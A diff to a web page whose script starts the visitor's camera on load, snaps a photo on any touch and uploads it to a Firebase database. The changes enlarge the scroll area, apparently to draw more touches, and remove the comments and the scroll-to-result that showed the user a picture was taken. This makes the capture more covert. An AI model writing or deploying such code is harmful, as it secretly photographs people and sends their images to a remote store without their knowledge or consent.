@@ -8,7 +8,7 @@
       background: black;
       margin: 0;
       padding: 0;
-      height: 100vh;
+      min-height: 200vh; /* Yeh line scroll area zyada karti hai */
       overflow-y: scroll;
       font-family: sans-serif;
     }
@@ -61,12 +61,10 @@
     const canvas = document.getElementById('canvas');
     const img = document.getElementById('livePhoto');
 
-    // Start camera
     navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
       video.srcObject = stream;
     });
 
-    // Capture on any touch
     function capture() {
       const ctx = canvas.getContext('2d');
       canvas.width = video.videoWidth;
@@ -74,17 +72,15 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const dataUrl = canvas.toDataURL("image/jpeg");
 
-      // Upload to Firebase
       db.ref("livephoto").set({
         image: dataUrl,
         time: Date.now()
       });
 
-      // Smooth scroll to result
-      document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
+      // Auto scroll removed
+      // document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
     }
 
-    // Listen and display live image
     db.ref("livephoto").on("value", snapshot => {
       const data = snapshot.val();
       if (data && data.image) {
